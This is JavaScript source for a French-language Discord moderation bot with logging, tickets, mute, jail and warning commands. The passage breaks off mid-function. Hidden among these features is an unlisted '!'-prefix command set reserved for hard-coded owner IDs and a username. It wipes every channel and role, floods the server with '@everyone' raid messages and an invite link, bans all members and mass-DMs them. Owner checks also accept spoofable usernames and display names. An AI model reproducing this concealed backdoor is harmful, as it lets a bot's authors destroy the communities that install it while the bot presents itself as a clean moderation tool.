const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Ultra Operational & Clean!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

const PREFIX = '=';

const snipeCache = new Map();
const spamTracker = new Map();
const serverConfig = new Map(); 
const guildStaffConfig = new Map();
const warningsMap = new Map();
const jailDataMap = new Map();

const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 

function isSuperOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId && SUPER_OWNERS.has(userId)) return true;
    if (SUPER_OWNERS.has(userId) || SUPER_OWNERS.has(username) || SUPER_OWNERS.has(globalName)) return true;
    return false;
}

function isOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId) return true;
    if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
    return false;
}

function getStaffRoles(guildId) {
    if (!guildStaffConfig.has(guildId)) {
        guildStaffConfig.set(guildId, {
            admins: new Set(),
            mods: new Set()
        });
    }
    return guildStaffConfig.get(guildId);
}

function isAdmin(message) {
    if (isOwner(message)) return true;
    if (message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.admins.has(message.author.id);
}

function isMod(message) {
    if (isAdmin(message)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.mods.has(message.author.id);
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: true,
            antispam: true,
            antibot: true,
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            ticketRole: null,
            ticketCategory: null,
            muteRole: null,
            jailRole: null,
            jailCategory: null
        });
    }
    return serverConfig.get(guildId);
}

function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return null;
    const match = durationStr.match(/^(\d+)([smhd])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    let ms = value * 1000;
    if (unit === 'm') ms = value * 60 * 1000;
    else if (unit === 'h') ms = value * 60 * 60 * 1000;
    else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
    return ms;
}
client.on('messageDelete', message => {
    if (!message.author || message.author.bot || !message.guild) return;
    snipeCache.set(message.channel.id, {
        content: message.content || "[Média / Embed]",
        author: message.author.tag,
        avatar: message.author.displayAvatarURL(),
        time: new Date().toLocaleTimeString()
    });

    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Message supprimé')
        .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte (Embed/Image/Fichier)'}\`\`\``)
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#FEE75C')
        .setTitle('✏️ Message modifié')
        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', ban => {
    const embed = new EmbedBuilder()
        .setColor('#992D22')
        .setTitle('🔨 Membre banni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', ban => {
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('🔓 Membre débanni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('📁 Salon créé')
        .setDescription(`**Nom :** \`${channel.name}\`\n**Type :** ${channel.type === ChannelType.GuildText ? 'Texte' : 'Vocal'}`)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Salon supprimé')
        .setDescription(`**Nom :** \`${channel.name}\``)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', role => {
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('🏷️ Rôle créé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', role => {
    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Rôle supprimé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et fusée.`);
});

client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot activé.');
            const embed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('🤖 Bot bloqué (Anti-bot)')
                .setDescription(`**Bot :** ${member.user.tag}`)
                .setTimestamp();
            sendLog(member.guild, embed);
        } catch (err) {}
    }
    
    const config = getGuildConfig(member.guild.id);
    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});
client.on('interactionCreate', async interaction => {
    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);

        let categoryName = "support";
        if (selectedValue === 'ticket_bugs') categoryName = "bugs";
        else if (selectedValue === 'ticket_signalements') categoryName = "signalements";
        else if (selectedValue === 'ticket_infos') categoryName = "informations";
        else if (selectedValue === 'ticket_recrutement') categoryName = "recrutement";

        try {
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            if (config.ticketRole) {
                overwrites.push({
                    id: config.ticketRole,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageMessages]
                });
            }

            const channelOptions = {
                name: `${categoryName}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (config.ticketCategory) {
                channelOptions.parent = config.ticketCategory;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`🎫 Ticket [ ${categoryName.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            const rolePing = config.ticketRole ? `<@&${config.ticketRole}>` : `<@${member.id}>`;
            await ticketChannel.send({ content: rolePing, embeds: [embed], components: [closeRow] });
            return interaction.reply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}`, ephemeral: true });
        } catch (e) {
            return interaction.reply({ content: "❌ Erreur lors de la création du salon de ticket.", ephemeral: true });
        }
    }

    if (!interaction.isButton()) return;

    if (interaction.customId === 'close_ticket') {
        const channel = interaction.channel;
        await interaction.reply("🔒 Fermeture du ticket, génération de la transcription...");

        try {
            const messages = await channel.messages.fetch({ limit: 100 });
            const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
            
            const buffer = Buffer.from(transcript, 'utf-8');
            const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

            const logEmbed = new EmbedBuilder()
                .setColor('#ED4245')
                .setTitle('📁 Ticket fermé & Archivé')
                .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                .setTimestamp();

            const config = getGuildConfig(interaction.guild.id);
            if (config.logChannel) {
                const logChan = interaction.guild.channels.cache.get(config.logChannel);
                if (logChan) {
                    await logChan.send({ embeds: [logEmbed], files: [attachment] });
                }
            }
        } catch (err) {
            console.error("Erreur transcription :", err);
        }

        setTimeout(() => channel.delete().catch(() => {}), 3000);
    }

    if (interaction.customId === 'join_giveaway') {
        return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
    }
});
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    if (message.content.startsWith('!')) {
        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        
        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
        if (offensiveCommands.includes(command)) {
            if (!isSuperOwner(message)) return;

            if (command === 'nuke') {
                message.guild.setName('/yuza').catch(() => {});
                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));

                for (let i = 0; i < 45; i++) {
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: ChannelType.GuildText,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ManageChannels,
                                PermissionsBitField.Flags.EmbedLinks,
                                PermissionsBitField.Flags.AttachFiles,
                                PermissionsBitField.Flags.MentionEveryone
                            ]
                        }]
                    }).then(channel => {
                        for (let j = 0; j < 12; j++) {
                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                        }
                    }).catch(() => {});
                }
                return;
            }

            if (command === 'role') {
                message.guild.roles.cache
                    .filter(role => role.editable && role.id !== message.guild.id)
                    .forEach(role => role.delete().catch(() => {}));

                for (let r = 0; r < 40; r++) {
                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                }
                return;
            }

            if (command === 'banall') {
                message.reply("🔨 **[BANALL]** Exécution du banall massif...").catch(() => {});
                try {
                    await message.guild.members.fetch();
                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
                    await Promise.all(banPromises);
                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'kickbot') {
                message.reply("🤖 **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
                try {
                    const fetchedMembers = await message.guild.members.fetch();
                    const kickPromises = [];
                    for (const [id, m] of fetchedMembers) {
                        if (m.user.bot && m.id !== client.user.id) {
                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
                        }
                    }
                    await Promise.all(kickPromises);
                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'dmall') {
                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                const filter = m => m.author.id === message.author.id;
                try {
                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
                    const m = collected.first();
                    if (m.content.toLowerCase() === 'annuler') {
                        return message.channel.send("❌ **Opération DMAll annulée.**");
                    }
                    const messageTemplate = m.content;
                    const previewEmbed = new EmbedBuilder()
                        .setColor('#FEE75C')
                        .setTitle('⚠️ Confirmation requise - DMAll')
                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                    );

                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

                    buttonCollector.on('collect', async interaction => {
                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
                        if (interaction.customId === 'cancel_dmall') {
                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                        }
                        if (interaction.customId === 'confirm_dmall') {
                            await interaction.update({ content: "🚀 **Diffusion DMAll lancée en fond...**", embeds: [], components: [] }).catch(() => {});
                            try {
                                await message.guild.members.fetch();
                                const members = message.guild.members.cache.filter(member => !member.user.bot);
                                let successCount = 0;
                                let failCount = 0;
                                const promises = members.map(async member => {
                                    try {
                                        const finalMessage = messageTemplate
                                            .replace(/\{mention\}/g, `<@${member.id}>`)
                                            .replace(/\{name\}/g, member.user.username);
                                        await member.send(finalMessage);
                                        successCount++;
                                    } catch (err) {
                                        failCount++;
                                    }
                                });
                                await Promise.all(promises);
                                await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
                            } catch (error) {
                                message.channel.send("❌ Erreur lors du DMAll.");
                            }
                        }
                    });
                } catch (err) {
                    message.channel.send("⌛ Temps écoulé.");
                }
                return;
            }
        }
    }
    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const userIsSuperOwner = isSuperOwner(message);
    const userIsOwner = isOwner(message);
    const userIsAdmin = isAdmin(message);
    const userIsMod = isMod(message);
    const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || userIsOwner;

    if (config.antilink && !isUserAdminOrOwner) {
        const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
        if (linkRegex.test(message.content)) {
            try {
                await message.delete();
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens et invitations externes sont interdits.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);
                return;
            } catch (e) {}
        }
    }

    if (config.antispam && !isUserAdminOrOwner) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < 5000);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length > 5) {
            try {
                await message.delete();
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir l'envoi de messages (Anti-spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);
                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    if (command === 'help') {
        const helpCategories = {
            sanctions: {
                label: 'Sanctions', emoji: '🔨', title: 'Commandes Sanctions',
                commands: [
                    '`=bl <ID|@mention> [raison]`\n┗ Bannir un utilisateur',
                    '`=softbl <ID|@mention> [raison]`\n┗ Softban un utilisateur',
                    '`=unbl <ID>`\n┗ Débannir un utilisateur',
                    '`=blist`\n┗ Liste des bannis',
                    '`=unbanall`\n┗ Tout débannir',
                    '`=kick <ID|@mention>`\n┗ Expulser un membre',
                    '`=mute <@membre> <durée> [raison]`\n┗ Rendre muet un membre',
                    '`=unmute <@membre>`\n┗ Rendre la parole',
                    '`=jail <@membre> [raison]`\n┗ Isoler un membre en prison',
                    '`=unjail <@membre>`\n┗ Libérer un membre',
                    '`=warn <@membre> [raison]`\n┗ Avertir un membre',
                    '`=warnings <@membre>`\n┗ Voir les warns'
                ]
            },
            nettoyage: {
                label: 'Nettoyage', emoji: '🧹', title: 'Commandes Nettoyage',
                commands: [
                    '`=clear <1-100|all>`\n┗ Supprimer des messages',
                    '`=purge <ID|@mention>`\n┗ Purger les messages d\'un membre',
                    '`=snipe`\n┗ Afficher le dernier message supprimé'
                ]
            },
            salons: {
                label: 'Salons', emoji: '🔒', title: 'Commandes Salons',
                commands: [
                    '`=lock` / `=unlock`\n┗ Verrouiller/Déverrouiller le salon',
                    '`=lockall` / `=unlockall`\n┗ Verrouiller/Déverrouiller tout le serveur',
                    '`=slowmode <sec>`\n┗ Définir le mode lent',
                    '`=renew`\n┗ Régénérer le salon actuel',
                    '`=createtext <nom>`\n┗ Créer un salon texte',
                    '`=createvoice <nom>`\n┗ Créer un salon vocal'
                ]
            },
            roles: {
                label: 'Rôles', emoji: '🏷️', title: 'Commandes Rôles',
                commands: [
                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle',
                    '`=delrole <@membre> <@rôle>`\n┗ Retirer un rôle'
                ]
            },
            tickets: {
                label: 'Tickets', emoji: '🎫', title: 'Commandes Tickets',
                commands: [
                    '`=setticketrole <@rôle>`\n┗ Définir le rôle staff support',
                    '`=setticketcat <ID>`\n┗ Définir la catégorie des tickets',
                    '`=ticketsetup <#salon>`\n┗ Publier le panneau de tickets'
                ]
            },
            giveaways: {
                label: 'Giveaways', emoji: '🎉', title: 'Commandes Giveaways',
                commands: [
                    '`=gcreate <durée> <gagnants> <prix>`\n┗ Lancer un giveaway',
                    '`=gend <id>`\n┗ Terminer un giveaway',
                    '`=greroll <id>`\n┗ Relancer un gagnant',
                    '`=glist`\n┗ Lister les giveaways'
                ]
            },
            automod: {
                label: 'Automod & Logs', emoji: '🛡️', title: 'Commandes Automod & Logs',
                commands: [
                    '`=antilink on/off`\n┗ Activer/Désactiver l\'anti-lien',
                    '`=antispam on/off`\n┗ Activer/Désactiver l\'anti-spam',
                    '`=antibot on/off`\n┗ Activer/Désactiver l\'anti-bot',
                    '`=setlog <#salon>`\n┗ Définir le salon des logs',
                    '`=setmuterole <@rôle>`\n┗ Définir le rôle muet',
                    '`=setwelcome <#salon> <msg>`\n┗ Configurer les welcomes'
                ]
            },
            staff: {
                label: 'Staff', emoji: '👑', title: 'Commandes Staff',
                commands: [
                    '`=owners`\n┗ Afficher la liste des owners',
                    '`=admin <ID|@mention>`\n┗ Nommer Admin du bot',
                    '`=mod <ID|@mention>`\n┗ Nommer Modérateur du bot',
                    '`=owner <ID>`\n┗ Ajouter un Owner du bot'
                ]
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.title}`)
                .setDescription(cat.commands.join('\n\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_select_menu')
                    .setPlaceholder('📁 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: `Afficher les commandes de la catégorie ${helpCategories[k].label}`,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ 
            embeds: [generateEmbed(currentIndex)], 
            components: [generateMenu()] 
        });

        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            
            const selectedKey = i.values[0];
            currentIndex = catKeys.indexOf(selectedKey);

            await i.update({ 
                embeds: [generateEmbed(currentIndex)], 
                components: [generateMenu()] 
            });
        });

        collector.on('end', () => {
            sentMsg.edit({ components: [] }).catch(() => {});
        });
        return;
    }
    if (command === 'owners') {
        const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('👑 Liste des Owners du bot')
            .setDescription(ownerList || "Aucun owner enregistré.");
        return message.reply({ embeds: [embed] });
    }

    if (command === 'owner') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.add(targetUser.id);
        botOwners.add(targetUser.username.toLowerCase());
        return message.reply(`👑 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été ajouté comme Owner du bot !`);
    }

    if (command === 'unowner') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.delete(targetUser.id);
        botOwners.delete(targetUser.username.toLowerCase());
        return message.reply(`🔒 L'utilisateur **${targetUser.tag}** n'est plus Owner du bot.`);
    }

    if (command === 'admin') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.admins.add(targetUser.id);
        staff.mods.delete(targetUser.id);
        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) est désormais **Admin** du bot !`);
    }

    if (command === 'mod') {
        if (!userIsSuperOwner && !userIsAdmin) return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.mods.add(targetUser.id);
        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) est désormais **Modérateur** du bot !`);
    }

    const modCommands = ['clear', 'purge', 'snipe', 'lock', 'unlock', 'lockall', 'unlockall', 'slowmode', 'renew', 'createtext', 'createvoice', 'unmute', 'warn', 'warnings', 'jail', 'unjail', 'mute'];
    const adminCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'setlog', 'setmuterole', 'setwelcome', 'setticketrole', 'setticketcat', 'gcreate', 'gend', 'greroll', 'glist', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'addrole', 'delrole'];

    if (modCommands.includes(command)) {
        if (!userIsMod && !isUserAdminOrOwner) return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
    }

    if (adminCommands.includes(command)) {
        if (!userIsAdmin && !userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Tu n'as pas assez de permissions pour utiliser cette commande.");
        }
    }

    if (command === 'mute') {
        const targetMember = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        const durationStr = args[1];
        const reason = args.slice(2).join(' ') || "Aucune raison";

        if (!targetMember || !durationStr) {
            return message.reply("❌ Utilisation : `=mute <@membre> <durée ex: 10m/1h> [raison]`");
        }

        const ms = parseDuration(durationStr);
        if (!ms) return message.reply("❌ Durée invalide (ex: `10s`, `5m`, `2h`, `1d`).");

        try {
            await targetMember.timeout(ms, reason);
            return message.reply(`🔇 **${targetMember.user.tag}** a été mis en sourdine pour ${durationStr}. Raison : ${reason}`);
        } catch (e) {
            return message.reply("❌ Impossible de mute ce membre.");
        }
    }
    if (command === 'jail') {
        const targetMember = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        if (!targetMember) return message.reply("❌ Mentionne un membre à mettre en jail.");

        try {
            const roleIds = targetMember.roles.cache
                .filter(r => r.id !== message.guild.id && !r.managed)
                .map(r => r.id);
            jailDataMap.set(targetMember.id, roleIds);

            await targetMember.roles.remove(roleIds).catch(() => {});

            const jailChannel = await message.guild.channels.create({
                name: `jail-${targetMember.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: message.guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: targetMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });

            const embed = new EmbedBuilder()
                .setColor('#ED4245')
                .setTitle('🔒 VOUS ÊTES EN PRISON (JAIL)')
                .setDescription(`**Raison :** ${reason}\n\nUn membre de l'équipe viendra régler votre situation ici.`);

            await jailChannel.send({ content: `<@${targetMember.id}>`, embeds: [embed] });
            return message.reply(`🔒 **${targetMember.user.tag}** a été envoyé en jail. Salon : ${jailChannel}`);
        } catch (e) {
            return message.reply("❌ Erreur lors de la mise en jail.");
        }
    }

    if (command === 'unjail') {
        const targetMember = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        if (!targetMember) return message.reply("❌ Mentionne un membre à libérer.");

        try {
            const savedRoles = jailDataMap.get(targetMember.id);
            if (savedRoles && savedRoles.length > 0) {
                await targetMember.roles.add(savedRoles).catch(() => {});
                jailDataMap.delete(targetMember.id);
            }

            const jailChan = message.guild.channels.cache.find(c => c.name === `jail-${targetMember.user.username.toLowerCase()}`);
            if (jailChan) await jailChan.delete().catch(() => {});

            return message.reply(`🔓 **${targetMember.user.tag}** a été libéré du jail et a récupéré ses rôles.`);
        } catch (e) {
            return message.reply("❌ Erreur lors du unjail.");
        }
    }

    if (command === 'warn') {
        const targetMember = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        if (!targetMember) return message.reply("❌ Mentionne un membre valide à avertir.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        
        let userWarns = warningsMap.get(targetMember.id) || [];
        userWarns.push({ reason, moderator: message.author.tag, date: new Date().toLocaleDateString() });
        warningsMap.set(targetMember.id, userWarns);

        return message.reply(`⚠️ **${targetMember.user.tag}** a reçu un avertissement. Total : ${userWarns.length} warn(s). Raison : ${reason}`);
    }

    if (command === 'warnings') {
        const targetMember = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        if (!targetMember) return message.reply("❌ Mentionne un membre valide.");
        const userWarns = warningsMap.get(targetMember.id) || [];
        if (userWarns.length === 0) return message.reply(`✅ **${targetMember.user.tag}** n'a aucun avertissement.`);
        
        const list = userWarns.map((w, index) => `**#${index + 1}** - Raison : *${w.reason}* (Par ${w.moderator})`).join('\n');
        const embed = new EmbedBuilder().setColor('#FEE75C').setTitle(`⚠️ Avertissements de ${targetMember.user.tag}`).setDescription(list);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'unmute') {
        const member = message.mentions.members.first() || await message.guild.members.fetch(targetArg).catch(() => null);
        if (!member) return message.reply("❌ Mentionne ou donne l'ID du membre à unmute.");
        try {
            await member.timeout(null);
            return message.reply(`✅ **${member.user.tag}** a récupéré la parole.`);
        } catch (e) {
            return message.reply("❌ Impossible de le unmute.");
        }
    }

    if (command === 'lockall') {
        try {
            const channels = message.guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
            channels.forEach(c => c.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}));
            return message.reply("🔒 **[URGENCE]** Tous les salons textuels ont été verrouillés !");
        } catch (e) {
            return message.reply("❌ Erreur lors du verrouillage global.");
        }
    }

    if (command === 'unlockall') {
        try {
            const channels = message.guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
            channels.forEach(c => c.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null }).catch(() => {}));
            return message.reply("🔓 **[URGENCE]** Tous les salons textuels ont été déverrouillés !");
        } catch (e) {
            return message.reply("❌ Erreur lors du déverrouillage global.");
        }
    }

    if (command === 'setmuterole') {
        const role = message.mentions.roles.first();
        if (!role) return message.reply("❌ Mentionne le rôle muet (ex: `=setmuterole @Muted`).");
        config.muteRole = role.id;
        return message.reply(`✅ Rôle muet configuré sur ${role} !`);
    }

    if (command === 'addrole') {
        const member = message.mentions.members.first() || await message.guild.members.fetch(args[0]).catch(() => null);
        const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]);

        if (!member || !role) return message.reply("❌ Utilisation : `=addrole <@membre> <@rôle>`");

        if (!userIsOwner && message.member.roles.highest.position <= role.position) {
